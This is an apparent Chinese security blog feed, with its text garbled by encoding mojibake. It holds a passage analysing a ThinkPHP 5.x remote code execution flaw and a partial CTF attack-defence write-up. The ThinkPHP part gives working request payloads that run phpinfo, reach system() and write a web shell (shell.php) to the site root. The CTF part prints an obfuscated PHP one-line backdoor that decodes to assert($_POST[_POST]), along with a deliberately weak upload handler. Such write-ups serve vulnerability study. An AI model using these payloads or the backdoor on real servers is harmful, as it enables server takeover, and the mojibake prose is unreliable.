<p>è¯¥å‡½æ•°ä¸­çš„$nameå˜é‡æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œéšåè°ƒç”¨parseModuleAndClass()å‡½æ•°å¯¹å…¶è¿›è¡Œå‡ºæ¥ï¼Œè·Ÿè¿›parseModuleAndClass()å‡½æ•°ï¼š/thinkphp/library/think/App.phpï¼š641è¡Œ<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-07e89c869dad893a.png" alt></p>
<p>å½“$nameä¸­å­˜åœ¨â€™\â€™æ—¶ï¼Œç›´æ¥å°†$nameå€¼èµ‹ç»™$classï¼Œç„¶åå®ä¾‹åŒ–$classï¼Œå¹¶è¿”å›ï¼Œè¿™é‡Œå¯èƒ½æœ‰äº›äººä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå®ä¾‹åŒ–$classï¼Œåœ¨parseModuleAndClass()å‡½æ•°æ‰§è¡Œåè¿”å›åˆ°controller()å‡½æ•°ä¸­<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-421115b8dd62a04c.png" alt></p>
<p>å…¶ä¸­è¿”å›äº†$classå˜é‡ï¼Œæ‰€ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•<strong>get()å‡½æ•°è¿›è¡Œå¤„ç†ï¼ŒAppç±»æ˜¯ç»§æ‰¿äºContainerçš„ï¼Œæ‰€ä»¥å¯ä»¥å»æŸ¥çœ‹Containerç±»ä¸­çš„é­”æœ¯æ–¹æ³•</strong>getï¼ˆï¼‰</p>
<blockquote>
<p>   public function __get($name)<br>     {<br>         return $this-&gt;make($name);<br>     }</p>
</blockquote>
<p>__get()è°ƒç”¨äº†make()å‡½æ•°ï¼Œè·Ÿè¸ªæŸ¥çœ‹ï¼š/thinkphp/library/think/Container.phpï¼š260è¡Œ<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4ca3c727765e9aa9.png" alt><br>make()å°†ä¼ å…¥çš„ä¼ å…¥çš„å˜é‡å®ä¾‹åŒ–ä¸ºä¸€ä¸ªç±»ï¼Œå³controller()ä¸­$nameä¸ºæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å€¼ï¼Œå¯ä»¥é€šè¿‡æ„é€ $nameå˜é‡æ¥å®ä¾‹åŒ–ä»»ä½•ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ s=index/\think\class/methodæ¥å®ä¾‹åŒ–\think\classç±»å¹¶ä¸”æ‰§è¡Œè¯¥ç±»çš„methodæ–¹æ³•è¾¾åˆ°æ§åˆ¶ç¨‹åºæµï¼Œç”±äºRule.phpä¸­parseUrlPath()å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨â€™|â€™è¿›è¡Œè¿›è¡Œæ„é€ ï¼Œå³index|\think\class|methodã€‚åœ¨\think\Requestç±»ä¸­æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•input:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-1f04a555594188ec.png" alt></p>
<p>é€šè¿‡æ„é€ payloadï¼š</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">s=<span class="meta">index</span>/\think\Request/<span class="meta">input</span><span class="variable">&amp;filter</span>=phpinfo<span class="variable">&amp;data</span>=1</span><br></pre></td></tr></table></figure>
<p>å³å¯è°ƒç”¨phpinfoå‡½æ•°ï¼Œè°ƒç”¨system()å‡½æ•°ä¾¿å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-0b758b746098057e.png" alt></p>
<p>åœ¨\think\template\driver\fileç±»ä¸­æ‰¾åˆ°å¯ä»¥ä»»æ„å†™æ–‡ä»¶çš„æ–¹æ³•write:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-ccdb8cfa53ac94f7.png" alt></p>
<p>æ‰€ä»¥é€šè¿‡æ„é€ payloadï¼š</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?s=<span class="meta">index</span>/\think\template\driver\<span class="meta">file</span>/write<span class="variable">&amp;cacheFile</span>=shell.php<span class="variable">&amp;content</span>=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-38f8d87c894429d4.png" alt></p>
<p>ä¾¿å¯ä»¥åœ¨ç½‘ç«™æ ¹ç›®å½•å†™å…¥ä»»æ„æ¶æ„æ–‡ä»¶ï¼Œä»è€Œè¾¾åˆ°æ§åˆ¶ç›®æ ‡æœåŠ¡å™¨çš„ç›®çš„ï¼Œå¯ä»¥è°ƒç”¨è¿›è¡Œæ¶æ„æ“ä½œçš„ç±»æ¯”è¾ƒå¤šã€‚</p>
<p>å¯¹äºThinkphp5.0ç‰ˆæœ¬çš„ï¼Œå…¶è·¯ç”±æ§åˆ¶å™¨å®ç°åŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å„ç§è°ƒç”¨æ–¹å¼å’Œå‡½æ•°åä¸å¤ªç›¸åŒï¼Œè¿™é‡Œä¸è¯¦ç»†åˆ†æï¼Œæ¼æ´åˆ©ç”¨æ—¶è°ƒç”¨çš„æ–¹æ³•ä¸ä¸€æ ·ï¼Œé€šè¿‡æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨appç±»ä¸­çš„invokeFunctionæ–¹æ³•ï¼š<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-2a47a46b95e5af6b.png" alt></p>
<p>é€šè¿‡å®ä¾‹åŒ–ReflectionFunctionç±»ï¼Œè°ƒç”¨functionå‡½æ•°ï¼Œç”±äºå˜é‡$varä¸ºæ•°ç»„ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ payloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-b7e6f442b42a7dac.png" alt></p>
<p>é€šè¿‡æ„é€ payload:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=file_</span>put_contents&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=shell.php&amp;vars[<span class="string">1</span>][<span class="symbol">1</span>]=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
<p>ä¾¿å¯ä»¥è¾¾åˆ°ä»»æ„å†™çš„ç›®çš„ï¼š<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-28e6c65aa5f32ad0.png" alt></p>
<p>åŒ5.1ç‰ˆæœ¬ä¸€æ ·ï¼Œå…¶parseUrlPathå‡½æ•°åœ¨å¤„ç†$urlæ—¶ä¹Ÿè¿›è¡Œäº†æ›¿æ¢å¤„ç†ï¼š</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥payloadä¸­çš„â€™/â€™ä¹Ÿå¯ä»¥åˆ©ç”¨â€™|â€™è¿›è¡Œæ›¿æ¢ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ä¸å”¯ä¸€ï¼Œé’ˆå¯¹Thinkphp5.*çš„ä¸åŒç‰ˆæœ¬å¯ä»¥å¯»æ‰¾ä¸åŒçš„ç±»è¿›è¡Œè°ƒç”¨ã€‚</p>
<p><strong>æ¼æ´åˆ†æä»…ç”¨äºå­¦ä¹ ï¼ï¼ï¼ä¸€åˆ‡å®é™…æ”»å‡»åˆ©ç”¨è¡Œä¸ºæ¦‚ä¸è´Ÿè´£ã€‚</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´åˆ†æä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>é¹åŸæ¯å†³èµ›-webæºç åˆ†æ&amp;ç¨³å®šè‡ªåŠ¨åŒ–ä¸Šåˆ†ä¹‹è·¯</title>
    <url>/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>èµ›åå¬è¯´æ˜¯å†³èµ›å¹³å°å±äºç¬¬ä¸€æ¬¡ä½¿ç”¨ï¼Œä¸çŸ¥é“æ˜¯å¦æœ‰æµ‹è¯•è¿‡ï¼Œåæ­£ä¸ªäººä½“éªŒä¸æ˜¯å¤ªå¥½ï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡ä½¿ç”¨æ¥è®²ï¼Œåº”è¯¥è¿˜ç®—ä¸é”™ï¼Œè¿˜æœ‰å¾ˆå¤§å‘å±•ç©ºé—´å˜›ã€‚ä¸»è¦å†™ä¸¤ä¸ªphpç«™çš„æºç åˆ†æï¼Œ ç¬¬ä¸€ä¸ªwebæ˜¯ <a href="https://pan.baidu.com/s/1RfyJxhATIkFnl1rFulaslA" target="_blank" rel="noopener">Lunar CMS 3.3</a> æå–ç : qqmgï¼Œç¬¬äºŒä¸ªæ˜¯ <a href="https://pan.baidu.com/s/14HwIUINbsX88ty0su3NPcA" target="_blank" rel="noopener">Woredpress 4.9</a> æå–ç : xwqh</p>
<h2 id="1-Lunar-CMS-æºç åˆ†æ"><a href="#1-Lunar-CMS-æºç åˆ†æ" class="headerlink" title="1. Lunar CMS æºç åˆ†æ"></a>1. Lunar CMS æºç åˆ†æ</h2><p>æ‹¿åˆ°æ”»é˜²èµ›æºç ä¸€èˆ¬å…ˆç”©æŸ¥æ€è½¯ä»¶æŸ¥æ€ä¸€ç•ªï¼Œç„¶åç”¨å¯¹åº”ç‰ˆæœ¬æºç Diffä¸€ä¸‹ï¼Œè¿™æ ·è¿™å¯å¾ˆå¿«åˆ†æå‡ºä»£ç å“ªäº›åœ°æ–¹æœ‰ä¿®æ”¹è¿‡ï¼ˆä¸€èˆ¬ä¿®æ”¹è¿‡çš„åœ°æ–¹å°±æ˜¯é¢„è®¾çš„æ¼æ´äº†ï¼‰ï¼Œå¦åˆ™é‚£å°±æ˜¯ç›´æ¥ç”¨ç‰ˆæœ¬CVEæ‰“äº†ã€‚æºç åœ¨æ¯”èµ›å¹³å°çˆ†ç‚¸ä¹‹å‰æ‹¿åˆ°çš„ï¼ŒåŠä¸ªå°æ—¶å†™å¥½äº†ä¸‰ä¸ªæ´çš„Expï¼Œæœ¬ä»¥ä¸ºç¨³å¦‚è€ç‹—ï¼Œæ²¡æƒ³åˆ°å¹³å°æ¢å¤æ—¶ä¸æå‰è¯´ä¸€å£°ï¼Œæœ¬èœè¿˜åœ¨çº¢è­¦ä¸­ï¼Œç­‰é€€å‡ºçº¢è­¦ï¼Œéƒ½è¢«ç¥ä»™ææƒäº†ã€‚</p>
<h3 id="0x01-å˜å½¢åé—¨"><a href="#0x01-å˜å½¢åé—¨" class="headerlink" title="0x01 å˜å½¢åé—¨"></a>0x01 å˜å½¢åé—¨</h3><p>ç”© Webshellkill æŸ¥æ€ä¸€ç•ªï¼Œæœ¬èœçš„Webshellkillè¡Œä¸ºåº“æ˜¯20181129çš„ï¼Œæ€ä¹ˆè¯´è¿˜æ˜¯è›®æ–°çš„</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-aab0c421151d43ed.png" alt></p>
<p>Webshellkill æ£€æµ‹å‡ºçš„å¯ç–‘æ–‡ä»¶æ˜¯åŸç‰ˆä¸­è‡ªå¸¦çš„ä»£ç æ–‡ä»¶ï¼Œæ‰€ä»¥å…ˆä¸ç®¡è¿™ä¸ªæ–‡ä»¶ï¼Œç”¨Diffå·¥å…·å¯¹é¢˜ç›®æºç å’ŒLunarCMS 3.3å·¦å³çš„ç‰ˆæœ¬çš„æºç è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-e80052c26ae90e19.png" alt></p>
<p>åœ¨adminç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªtool.phpæ–‡ä»¶ï¼Œçœ‹ä»£ç å¾ˆæ˜æ˜¾ä¸€ä¸ªé¢„ç•™çš„åé¢ï¼Œç«Ÿç„¶è¿˜è¿‡äº†Webshellkillçš„æŸ¥æ€ï¼Œæœæ–­æ”¶é›†ä¸€åªå…æ€é©¬ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#tool.phpï¼š</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Variable</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = <span class="string">'Bar'</span>;</span><br><span class="line">        $b=<span class="keyword">$this</span>-&gt;$name(); <span class="comment">// This calls the Bar() method</span></span><br><span class="line">        $b($c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	$__=<span class="string">'a'</span>;</span><br><span class="line">        $a1=$__; </span><br><span class="line">		$__++;$__++;$__++;$__++;</span><br><span class="line">		$a2=$__; </span><br><span class="line">		$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">		$a3=$__++; </span><br><span class="line">		$a4=$__++; </span><br><span class="line">		$a5=$__; </span><br><span class="line">		$a=$a1.$a4.$a4.$a2.$a3.$a5; </span><br><span class="line">        <span class="keyword">return</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">variable</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$_=<span class="string">'A'</span>;</span><br><span class="line">	$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;</span><br><span class="line">	$b1=$_++; </span><br><span class="line">	$b2=$_; </span><br><span class="line">	$_++;$_++;$_++;</span><br><span class="line">	$b3=$_++; </span><br><span class="line">	$b4=$_; </span><br><span class="line">	$b=<span class="string">'_'</span>.$b2.$b1.$b3.$b4; </span><br><span class="line">	<span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line">$funcname = <span class="string">"Variable"</span>;</span><br><span class="line">$bb=$&#123;variable()&#125;[variable()];</span><br><span class="line">$foo-&gt;$funcname($bb);</span><br></pre></td></tr></table></figure>
<p>é™æ€è°ƒè¯•ä¸‹åé—¨ä»£ç ï¼Œåˆ†åˆ«æŠŠ$aå’Œ$bç»™æ‰“å°å‡ºæ¥</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-d44013bfed92bdef.png" alt></p>
<p>æ‰€ä»¥æ‹¼æ¥èµ·æ¥ä¹Ÿå°±æ˜¯ä¸€ä¸ªç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå°±ä¸è´´Expäº†</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span>($<span class="variable">_POST</span>[<span class="variable">_POST</span>])</span><br></pre></td></tr></table></figure>



<h3 id="0x02-é¢„è®¾çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#0x02-é¢„è®¾çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x02 é¢„è®¾çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>0x02 é¢„è®¾çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3><p>å†™å¥½åé—¨åˆ©ç”¨çš„Expè„šæœ¬åï¼Œç»§ç»­Diffæ–‡ä»¶ï¼Œåœ¨adminç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªcertificateæ–‡ä»¶å¤¹</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-2e96eaed0531ec46.png" alt></p>
<p>æœ¬ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªæ’ä»¶ä»€ä¹ˆçš„ï¼ŒæŸ¥çœ‹ä»£ç å‘ç°æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œåšäº†ç‚¹ç‚¹è¿‡æ»¤</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#index.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#selectFile'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; $(<span class="string">'#file'</span>).trigger(<span class="string">'click'</span>) &#125;);</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#file'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; $(<span class="string">'#selectedFile'</span>).val($(<span class="keyword">this</span>).val()) &#125;);</span></span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-12"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"selectedFile"</span> <span class="attr">readonly</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span> <span class="attr">style</span>=<span class="string">"width:200px"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"selectFile"</span> <span class="attr">class</span>=<span class="string">"btn btn-defdault"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">style</span>=<span class="string">"margin-right:5px;"</span>&gt;</span>é€‰æ‹©æ–‡ä»¶<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>] === <span class="string">"POST"</span>) :</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>])):</span></span><br><span class="line"><span class="php">      $file = $_FILES[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">      $name = $file[<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span> (preg_match(<span class="string">"/^[a-zA-Z0-9]+\\.[a-zA-Z0-9]+$/"</span>, $name) ):</span></span><br><span class="line"><span class="php">        $data = file_get_contents($file[<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php">        <span class="keyword">while</span>($next = preg_replace(<span class="string">"/&lt;\\?/"</span>, <span class="string">""</span>, $data))&#123;</span></span><br><span class="line"><span class="php">          $next = preg_replace(<span class="string">"/php/"</span>, <span class="string">""</span>, $next);</span></span><br><span class="line"><span class="php">          <span class="keyword">if</span>($data === $next) &#123;</span></span><br><span class="line"><span class="php">			  <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">		  &#125;</span></span><br><span class="line"><span class="php">		  source();</span></span><br><span class="line"><span class="php">          $data = $next;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        file_put_contents(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/u/'</span> . $name, $data);</span></span><br><span class="line"><span class="php">        chmod(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/u/'</span> . $name, <span class="number">0644</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;?php echo htmlspecialchars("</span><span class="attr">u</span>/" <span class="attr">.</span> $<span class="attr">name</span>)?&gt;</span>"&gt;ä¸Šä¼ æˆåŠŸ!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">      <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ†æä¸»ä½“ä»£ç ï¼Œè¿™ä¸ªä¸Šä¼ ç‚¹å†™å¾—æ¯”è¾ƒç®€å•</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-43d2cca6660c725e.png" alt></p>
